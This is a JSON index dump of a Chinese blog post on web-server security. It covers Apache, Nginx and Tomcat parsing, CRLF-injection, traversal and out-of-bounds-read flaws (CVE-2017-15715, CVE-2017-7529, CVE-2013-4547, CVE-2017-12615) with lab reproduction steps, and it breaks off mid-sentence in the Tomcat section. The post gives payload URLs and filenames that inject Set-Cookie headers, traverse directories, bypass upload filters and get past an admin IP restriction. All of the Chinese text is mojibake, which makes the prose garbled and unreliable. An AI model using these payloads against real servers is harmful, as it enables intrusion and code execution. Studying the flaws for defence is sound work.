æœåŠ¡å™¨è½¯ä»¶çš„è®¡ç®—æœºã€‚ Web ä¸­é—´ä»¶ï¼šæä¾›ç³»ç»Ÿè½¯ä»¶ä¸åº”ç”¨è½¯ä»¶ä¹‹é—´è¿æ¥çš„è½¯ä»¶ï¼ŒWeb ä¸­é—´ä»¶æ˜¯æä¾› web åº”ç”¨è½¯ä»¶å’Œç³»ç»Ÿè½¯ä»¶è¿æ¥çš„è½¯ä»¶çš„æ€»ç§°ã€‚ Web å®¹å™¨ï¼šå®¹å™¨æ˜¯ä¸­é—´ä»¶çš„ä¸€ç§ï¼Œå®ƒç»™å¤„äºå…¶ä¸­çš„åº”ç”¨ç¨‹åºç»„ä»¶æä¾›ä»ä¸€ä¸ªç¯å¢ƒï¼Œä½¿åº”ç”¨ç¨‹åºç›´æ¥ä¸å®¹å™¨ä¸­çš„ç¯å¢ƒå˜é‡è¿›è¡Œäº¤äº’è€Œä¸å¿…å…³æ³¨å…¶ä»–çš„ç³»ç»Ÿé—®é¢˜ã€‚Web å®¹å™¨ç”¨äºç»™å¤„äºå…¶ä¸­çš„åº”ç”¨ç¨‹åºç»„ä»¶æä¾›ä¸€ä¸ªç¯å¢ƒã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 Apache å®‰å…¨ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 apache é…ç½®é”™è¯¯ 2.1.1 åŸç† AddHandler application/x-httpd-php .php AddHandler ä¸ºç›¸åº”çš„æ–‡ä»¶æ‰©å±•åæŒ‡å®šå¤„ç†ç¨‹åºï¼Œä¸Šè¿°çš„é…ç½®æ„å‘³ç€å°†æ‰©å±•åä¸º .php çš„æ–‡ä»¶äº¤ç»™ x-httpd-php ç¨‹åºå¤„ç† Apache è¯†åˆ«æ–‡ä»¶æ‰©å±•åæ˜¯ä»åå¾€å‰çš„ï¼Œå¦‚æœé‡åˆ°äº†æ— æ³•è¯†åˆ«çš„æ‰©å±•åä¼šæ¥ç€å¾€å‰è¯†åˆ«ï¼Œé‡åˆ°ç¬¬ä¸€ä¸ªå¯ä»¥è¯†åˆ«çš„æ‰©å±•åä½œä¸ºè¯¥æ–‡ä»¶çš„æ‰©å±•å 2.1.2 é…ç½® 2.1.2.1 ä¿®æ”¹ conf æ–‡ä»¶ 2.1.2.2 åˆ›å»º .htaccess 2.1.3 æ¼æ´å¤ç° åœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰ .php åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆ PHP æ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚ ç¯å¢ƒè¿è¡Œåï¼Œè®¿é—® http://your-ip/uploadfiles/apache.php.jpeg å³å¯å‘ç°ï¼Œphpinfo è¢«æ‰§è¡Œäº†ï¼Œè¯¥æ–‡ä»¶è¢«è§£æä¸º php è„šæœ¬ã€‚ http://your-ip/index.php ä¸­æ˜¯ä¸€ä¸ªç™½åå•æ£€æŸ¥æ–‡ä»¶åç¼€çš„ä¸Šä¼ ç»„ä»¶ï¼Œä¸Šä¼ å®Œæˆåå¹¶æœªé‡å‘½åã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ–‡ä»¶åä¸º xxx.php.jpg æˆ– xxx.php.jpeg çš„æ–‡ä»¶ï¼Œåˆ©ç”¨ Apache è§£ææ¼æ´è¿›è¡Œ getshellã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.2 apache æ¢è¡Œè§£ææ¼æ´ æ¼æ´ç¼–å·ï¼šCVE-2017-15715 å½±å“ç‰ˆæœ¬ï¼šApache 2.4.10 - 2.4.29 æ¼æ´åˆ©ç”¨ï¼šæ–‡ä»¶ä¸Šä¼  æ¼æ´åç§°ï¼šæ¢è¡Œè§£ææ¼æ´ 2.2.1 åŸç† å…¶ 2.4.0~2.4.29 ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æ PHP æ—¶ï¼Œ1.php\\x0A å°†è¢«æŒ‰ç…§ PHP åç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ 2.2.2 æ¼æ´å¤ç° \u003c?php if(isset($_FILES['file'])) { $name = basename($_POST['name']); $ext = pathinfo($name, PATHINFO_EXTENSION); if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) { exit('bad file'); } move_uploaded_file($_FILES['file']['tmp_name'], './' . $name); } åœ¨ 1.php åé¢æ’å…¥ä¸€ä¸ª \\x0Aï¼ˆæ³¨æ„ï¼Œä¸èƒ½æ˜¯\\x0D\\x0Aï¼Œåªèƒ½æ˜¯ä¸€ä¸ª\\x0Aï¼‰ï¼Œä¸å†æ‹¦æˆªï¼š è®¿é—®åˆšæ‰ä¸Šä¼ çš„ /1.php%0aï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æï¼Œä½†è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯ php åç¼€ï¼Œè¯´æ˜ç›®æ ‡å­˜åœ¨è§£ææ¼æ´ï¼š ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3 Nginx å®‰å…¨ nginx æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ HTTP å’Œåå‘ä»£ç† Web æœåŠ¡å™¨ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº† IMAP/POP3/SMTP æœåŠ¡ã€‚ ä¸­å›½å¤§é™†ä½¿ç”¨ Nginx ç½‘ç«™ç”¨æˆ·æœ‰ï¼šç™¾åº¦ã€äº¬ä¸œã€æ–°æµªã€ç½‘æ˜“ã€è…¾è®¯ç­‰ã€‚ Nginx å¯ä»¥åœ¨å¤§å¤šæ•° Unixã€ Linux ç¼–è¯‘è¿è¡Œï¼Œä¹Ÿæœ‰ Windows ç§»æ¤ç‰ˆã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.1 nginx é…ç½®é”™è¯¯ 3.1.1 CRLF æ³¨å…¥ CRLFï¼šå°±æ˜¯ CR å’Œ LFï¼Œåˆ†åˆ«è¡¨ç¤ºå›è½¦å’Œæ¢è¡Œï¼ŒCR å‘½ä»¤è®©æ‰“å°å¤´å›åˆ°å·¦è¾¹ã€‚LF å‘½ä»¤è®©çº¸å‰è¿›ä¸€è¡Œã€‚ åœ¨ HTTP æŠ¥æ–‡ä¸­ï¼Œè¡Œä¸è¡Œä¹‹é—´ä½¿ç”¨ CRLF é—´éš”ã€‚ æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„ CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸º HTTP å“åº”åˆ†æ¼æ´ã€‚ åœ¨ Nginx ä¸­é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸‰ä¸ªå¯ä»¥æ¥å— URL çš„å˜é‡ï¼š $URI $DOCUMENT_URI $REQUEST_URI å…¶ä¸­ï¼š $URI - è·å–è§£ç åçš„è¯·æ±‚è·¯å¾„ $DOCUMENT_URI - è·å–è§£ç åçš„è¯·æ±‚è·¯å¾„ $REQUEST_URI - æ²¡æœ‰è§£ç çš„å®Œæ•´çš„ URL 3.1.1.1 åŸç† Nginxä¼šå°† $uri è¿›è¡Œè§£ç ï¼Œå¯¼è‡´ä¼ å…¥ %0a%0d å³å¯å¼•å…¥æ¢è¡Œç¬¦ï¼Œé€ æˆ CRLF æ³¨å…¥æ¼æ´ã€‚ é”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆåŸæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†è®© http çš„è¯·æ±‚è·³è½¬åˆ° https ä¸Šï¼‰ï¼š location / { return 302 https://$host$uri; } 3.1.1.2 æ¼æ´å¤ç° Payloadï¼š http://your-ip:8080/%0a%0dSet-Cookie:%20a=1ï¼Œå¯æ³¨å…¥ Set-Cookie å¤´ã€‚ 3.1.2 ç›®å½•ç©¿è¶Šæ¼æ´ Nginx åœ¨é…ç½®åˆ«åï¼ˆAliasï¼‰çš„æ—¶å€™ï¼Œå¦‚æœå¿˜è®°åŠ  /ï¼Œå°†é€ æˆä¸€ä¸ªç›®å½•ç©¿è¶Šæ¼æ´ã€‚ é”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆåŸæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†è®©ç”¨æˆ·è®¿é—®åˆ° /home/ ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰ï¼š location /files { alias /home/; } Payload:ï¼šhttp://your-ip:8081/files../ ï¼ŒæˆåŠŸç©¿è¶Šåˆ°æ ¹ç›®å½•ï¼š ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.2 Nginx è¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ æ¼æ´ç¼–å·ï¼šCVE-2017-7529 å½±å“ç‰ˆæœ¬ï¼šNginx 0.5.6 - 1.13.2 æ¼æ´å±å®³ï¼šæ•æ„Ÿä¿¡æ¯æ³„éœ² 3.2.1 åŸç† 3.2.1.1 HTTP Range HTTP çš„ Rangeï¼Œå…è®¸å®¢æˆ·ç«¯åˆ†æ‰¹æ¬¡è¯·æ±‚èµ„æºçš„éƒ¨åˆ†ï¼Œå¦‚æœæœåŠ¡ç«¯èµ„æºè¾ƒå¤§ï¼Œå¯ä»¥é€šè¿‡ Range æ¥å¹¶å‘ä¸‹è½½ï¼›å¦‚æœè®¿é—®èµ„æºæ—¶ç½‘ç»œä¸­æ–­ï¼Œå¯ä»¥æ–­ç‚¹ç»­ä¼  Range è®¾ç½®åœ¨ HTTP è¯·æ±‚å¤´ä¸­ï¼Œå®ƒæ˜¯å¤šä¸ª byte-range-spec(æˆ– suffix-range-byte-spec)çš„é›†åˆ ç¤ºä¾‹ Rangeï¼šbytes=0-1024 è¡¨ç¤ºè®¿é—®ç¬¬ 0 åˆ°ç¬¬ 1024 å­—èŠ‚ Rangeï¼šbytes=500-600ï¼Œ601-999ï¼Œ-300 è¡¨ç¤ºåˆ†ä¸‰å—è®¿é—®ï¼Œåˆ†åˆ«æ˜¯ 500 åˆ° 600 å­—èŠ‚ï¼Œ601 åˆ° 600 å­—èŠ‚ï¼Œæœ€åçš„ 300 å­—èŠ‚; 3.2.1.2 HTTP-Cache Nginx å¯ä»¥ä½œä¸ºç¼“å­˜æœåŠ¡å™¨ï¼Œå°† Web åº”ç”¨æœåŠ¡å™¨è¿”å›çš„å†…å®¹ç¼“å­˜èµ·æ¥ã€‚å¦‚æœå®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹å·²ç»è¢«ç¼“å­˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å°†ç¼“å­˜å†…å®¹è¿”å›ï¼Œè€Œæ— éœ€å†æ¬¡è¯·æ±‚åº”ç”¨æœåŠ¡å™¨ã€‚ç”±æ­¤ï¼Œå¯é™ä½åº”ç”¨æœåŠ¡å™¨çš„è´Ÿè½½å¹¶æé«˜æœåŠ¡çš„å“åº”æ€§èƒ½ã€‚ Cache æ–‡ä»¶å†…å®¹ï¼š 3.2.1.3 åŸç†åˆ†æ Nginx å¯¹ Range çš„æ”¯æŒåŒ…æ‹¬ header å¤„ç†å’Œ body å¤„ç†ï¼Œåˆ†åˆ«ç”¨æ¥è§£æå®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ Range header å’Œè£å‰ªè¿”å›ç»™å®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ® Body ngx_http_range_header_filter_module è´Ÿè´£å¯¹ header æ•°æ®çš„å¤„ç† ngx_http_range_body_filter_module è´Ÿè´£å¯¹ body æ•°æ®çš„å¤„ç† è§£æè¿‡ç¨‹ï¼š åœ¨ ngx_http_range_parse å‡½æ•°ä¸­æœ‰è¿™æ ·ä¸€ä¸ªå¾ªç¯ è¿™æ®µä»£ç æ˜¯è¦æŠŠâ€œ-â€ä¸¤è¾¹çš„æ•°å­—å–å‡ºåˆ†åˆ«èµ‹å€¼ç»™ start å’Œ end å˜é‡ï¼Œå­—ç¬¦ä¸²æŒ‡é’ˆ p ä¸­å³ä¸º bytes= åé¢çš„å†…å®¹ã€‚ åœ¨ä¸Šé¢è¿™æ®µä»£ç ä¸­å­˜åœ¨ cutoff å’Œ cutlim é˜ˆå€¼é™å®šäº†ä»å­—ç¬¦ä¸²ä¸­è¯»å–æ—¶ä¸ä¼šè®© start æˆ– end ä¸ºè´Ÿå€¼ æ‰€ä»¥è¿™é‡Œéœ€è¦è¿›å…¥ suffix=1 çš„åˆ†æ”¯ï¼Œå› æ­¤ä½¿ç”¨ Range: bytes=-xxxï¼Œå³çœç•¥åˆå§‹ start å€¼çš„å½¢å¼ã€‚ start ç­‰äº content_length å‡å» end å€¼ï¼Œæ‰€ä»¥å¦‚æœä¼ å…¥çš„ end æ¯”å®é™…é•¿åº¦è¿˜è¦é•¿ï¼Œå°±å¯ä»¥ä½¿ start å˜ä¸ºè´Ÿæ•°ã€‚æœ€ç»ˆ end çš„å€¼ä¼šè¢«è®¾å®šä¸º content_length - 1 é€šè¿‡ä¸Šé¢çš„è®¾å®šåï¼Œè¿™å— range çš„æ€»é•¿åº¦å°±è¶…è¿‡äº†content-lengthã€‚è€Œ Nginxå¯¹ range æ€»é•¿åº¦ä¼šæœ‰æ£€æŸ¥ï¼Œä½†æ˜¯æ³¨æ„åˆ° size çš„å€¼æ˜¯ multipart çš„å…¨å±€ range é•¿åº¦ç›¸åŠ å¾—åˆ° å› æ­¤ï¼Œä¸€ä¸ª range æ˜¯ä¸å¤Ÿçš„ï¼Œè‡³å°‘éœ€è¦ä¸¤ä¸ª rangeï¼Œå…¶é•¿åº¦ä¹‹å’Œæº¢å‡ºä¸ºè´Ÿæ•°ï¼Œå°±å¯ä»¥ç»•è¿‡æ€»é•¿åº¦çš„æ£€æŸ¥äº†ã€‚ for å¾ªç¯æ˜¯ä¸€ä¸ªæ— æ¡ä»¶çš„å¾ªç¯ï¼Œæœ‰ä¸€ä¸ªé€€å‡ºæ¡ä»¶ä¸º =ï¼Œæ”¯æŒ range çš„å€¼ä¸º start1 - end1ï¼Œ start2 - end2 çš„å½¢å¼æ„é€  range: bytes=-x, -yã€‚ä¸€å¤§ä¸€å°ä¸¤ä¸ª end å€¼ï¼Œåªéœ€è¦æ§åˆ¶å‰é¢ä¸€ä¸ª end å€¼å°è€Œåä¸€ä¸ª end å€¼å¤§ï¼Œä»è€Œå®ç° star tå€¼å’Œ size å€¼çš†ä¸ºè´Ÿæ•°ï¼Œæ§åˆ¶ start å€¼è´Ÿåˆ°ä¸€ä¸ªåˆé€‚çš„ä½ç½®ï¼Œé‚£ä¹ˆå°±èƒ½æˆåŠŸè¯»åˆ°ç¼“å­˜æ–‡ä»¶å¤´éƒ¨äº†ã€‚ 3.2.2 æ¼æ´å¤ç° å¯è§ï¼Œè¶Šç•Œè¯»å–åˆ°äº†ä½äºã€ŒHTTPè¿”å›åŒ…ä½“ã€å‰çš„ã€Œæ–‡ä»¶å¤´ã€ã€ã€ŒHTTPè¿”å›åŒ…å¤´ã€ç­‰å†…å®¹ã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.3 Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ æ¼æ´ç¼–å·ï¼šCVE-2013-4547 æ¼æ´å±å®³ï¼šæ–‡ä»¶ä¸Šä¼ ã€ç»•è¿‡ç›®å½•é™åˆ¶ å½±å“ç‰ˆæœ¬ï¼š0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 3.3.1 åŸç† éæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ \\0 ä¼šå¯¼è‡´ Nginx è§£æ URI æ—¶çš„æœ‰é™çŠ¶æ€æœºæ··ä¹±ï¼Œå±å®³æ˜¯å…è®¸æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªéç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æœåŠ¡å™¨ä¸Šå­˜åœ¨æ–‡ä»¶ï¼šfile.aaa[ç©ºæ ¼]ï¼Œæ³¨æ„æ–‡ä»¶åçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ã€‚åˆ™å¯ä»¥é€šè¿‡è®¿é—®ï¼šhttp://127.0.0.1/file.aaa \\0.bbbï¼Œè®© Nginx è®¤ä¸ºæ–‡ä»¶ file.aaa çš„åç¼€ä¸º .bbbã€‚ 3.3.2 æ¼æ´å¤ç° 3.3.2.1 è§£ææ¼æ´ Nginx åŒ¹é…åˆ° .php ç»“å°¾çš„è¯·æ±‚ï¼Œå°±å‘é€ç»™ fastcgi è¿›è¡Œè§£æï¼Œå¸¸ç”¨çš„å†™æ³•å¦‚ä¸‹ï¼š location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } æ­£å¸¸æƒ…å†µä¸‹ï¼ˆå…³é—­ pathinfo çš„æƒ…å†µä¸‹ï¼‰ï¼Œåªæœ‰ .php åç¼€çš„æ–‡ä»¶æ‰ä¼šè¢«å‘é€ç»™ fastcgi è§£æã€‚ è€Œå­˜åœ¨ CVE-2013-4547 çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯·æ±‚ 1.gif[0x20][0x00].phpï¼Œè¿™ä¸ª URI å¯ä»¥åŒ¹é…ä¸Šæ­£åˆ™ \\.php$ï¼Œå¯ä»¥è¿›å…¥è¿™ä¸ª Location å—ï¼›ä½†è¿›å…¥åï¼ŒNginx å´é”™è¯¯åœ°è®¤ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯ 1.gif[0x20]ï¼Œå°±è®¾ç½®å…¶ä¸º SCRIPT_FILENAME çš„å€¼å‘é€ç»™ fastcgiã€‚ fastcgi æ ¹æ® SCRIPT_FILENAME çš„å€¼è¿›è¡Œè§£æï¼Œæœ€åé€ æˆäº†è§£ææ¼æ´ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªç©ºæ ¼ç»“å°¾çš„æ–‡ä»¶ï¼Œå³å¯ä½¿ PHP è§£æä¹‹ã€‚ è¯¥æ¼æ´åˆ©ç”¨æ¡ä»¶æœ‰ä¸¤ä¸ªï¼š Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 php-fpm.conf ä¸­çš„ security.limit_extensions ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´ä»»æ„åç¼€åéƒ½å¯ä»¥è§£æä¸º PHP vulhub ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—® http://your-ip:8080/å³å¯çœ‹åˆ°ä¸€ä¸ªä¸Šä¼ é¡µé¢ã€‚ è¿™ä¸ªç¯å¢ƒæ˜¯é»‘åå•éªŒè¯ï¼Œæˆ‘ä»¬æ— æ³•ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œéœ€è¦åˆ©ç”¨ CVE-2013-4547ã€‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª 1.gifï¼Œæ³¨æ„åé¢çš„ç©ºæ ¼ï¼š è®¿é—® http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].phpï¼Œå³å¯å‘ç° PHP å·²è¢«è§£æï¼š æ³¨æ„ï¼Œ[0x20]æ˜¯ç©ºæ ¼ï¼Œ[0x00]æ˜¯ \\0ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦éƒ½ä¸éœ€è¦ç¼–ç ã€‚ 3.3.2.2 ç»•è¿‡ç›®å½•é™åˆ¶ æ¯”å¦‚å¾ˆå¤šç½‘ç«™é™åˆ¶äº†å…è®¸è®¿é—®åå°çš„IPï¼š location /admin/ { allow 127.0.0.1; deny all; } é€šè¿‡è¯·æ±‚å¦‚ä¸‹ URIï¼š/test[0x20]/../admin/index.phpï¼Œè¿™ä¸ª URI ä¸ä¼šåŒ¹é…ä¸Š location åé¢çš„ /admin/ï¼Œä¹Ÿå°±ç»•è¿‡äº†å…¶ä¸­çš„ IP éªŒè¯ ä½†æœ€åè¯·æ±‚çš„æ˜¯ /test[0x20]/../admin/index.php æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ /admin/index.phpï¼ŒæˆåŠŸè®¿é—®åˆ°åå°ã€‚ ï¼ˆè¿™ä¸ªå‰ææ˜¯éœ€è¦æœ‰ä¸€ä¸ªç›®å½•å« testï¼šè¿™æ˜¯ Linux ç³»ç»Ÿçš„ç‰¹ç‚¹ï¼Œå¦‚æœæœ‰ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œåˆ™å³ä½¿è·³è½¬åˆ°ä¸Šä¸€å±‚ï¼Œä¹Ÿä¼šæŠ¥æ–‡ä»¶ä¸å­˜åœ¨çš„é”™è¯¯ï¼Œ Windows ä¸‹æ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼‰ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.4 Nginx è§£ææ¼æ´ æ¼æ´å±å®³ï¼šæ–‡ä»¶ä¸Šä¼  å½±å“ç‰ˆæœ¬ï¼š Nginx 1.x æœ€æ–°ç‰ˆ PHP 7.x æœ€æ–°ç‰ˆ 3.4.1 åŸç† nginx æŠŠä»¥ .php ç»“å°¾çš„æ–‡ä»¶äº¤ç»™ fastcgi å¤„ç†,ä¸ºæ­¤å¯ä»¥æ„é€  http://ip/uploadfiles/test.png/.phpï¼Œå…¶ä¸­ test.png æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„åŒ…å« PHP ä»£ç çš„å›¾ç‰‡æ–‡ä»¶ã€‚ fastcgi åœ¨å¤„ç† .php æ–‡ä»¶æ—¶å‘ç°æ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œè¿™æ—¶ php.ini é…ç½®æ–‡ä»¶ä¸­ cgi.fix_pathinfo=1 å‘æŒ¥ä½œç”¨ï¼Œè¿™é¡¹é…ç½®ç”¨äºä¿®å¤è·¯å¾„ï¼Œå¦‚æœå½“å‰è·¯å¾„ä¸å­˜åœ¨åˆ™é‡‡ç”¨ä¸Šå±‚è·¯å¾„ã€‚ä¸ºæ­¤è¿™é‡Œäº¤ç”± fastcgi å¤„ç†çš„æ–‡ä»¶å°±å˜æˆäº† /test.pngã€‚ æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ php-fpm.conf ä¸­çš„ security.limit_extensions é…ç½®é¡¹é™åˆ¶äº† fastcgi è§£ææ–‡ä»¶çš„ç±»å‹(å³æŒ‡å®šä»€ä¹ˆç±»å‹çš„æ–‡ä»¶å½“åšä»£ç è§£æ)ï¼Œæ­¤é¡¹è®¾ç½®ä¸ºç©ºçš„æ—¶å€™æ‰å…è®¸ fastcgi å°† .png ç­‰æ–‡ä»¶å½“åšä»£ç è§£æã€‚ 3.4.2 æ¼æ´å¤ç° è¯¥æ¼æ´ä¸ Nginxã€php ç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´ã€‚ è®¿é—® http://your-ip/uploadfiles/nginx.png å’Œ http://your-ip/uploadfiles/nginx.png/.php å³å¯æŸ¥çœ‹æ•ˆæœã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4 Tomcat å®‰å…¨ Tomcat æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„ Jakarta é¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œç”± Apacheã€Sun å’Œå…¶ä»–ä¸€äº›å…¬å¸åŠä¸ªäººå…±åŒå¼€å‘è€Œæˆã€‚ Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„ Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ã€‚ å®é™…ä¸Š Tomcat æ˜¯ Apache æœåŠ¡å™¨çš„æ‰©å±•ï¼Œä½†è¿è¡Œæ—¶å®ƒæ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œæ‰€ä»¥å½“ä½ è¿è¡Œ Tomcat æ—¶ï¼Œå®ƒå®é™…ä¸Šä½œä¸ºä¸€ä¸ªä¸ Apache ç‹¬ç«‹çš„è¿›ç¨‹å•ç‹¬è¿è¡Œçš„ã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.1 Tomcat é…ç½®é”™è¯¯ æ¼æ´ç¼–å·ï¼šCVE-2017-12615 å½±å“ç‰ˆæœ¬ï¼šApahce Tomcat 7.0.0 - 7.0.79 æ¼æ´è¯´æ˜ï¼šå½“ Tomcat è¿è¡Œåœ¨ Windows ä¸»æœºä¸Šï¼Œä¸”å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ 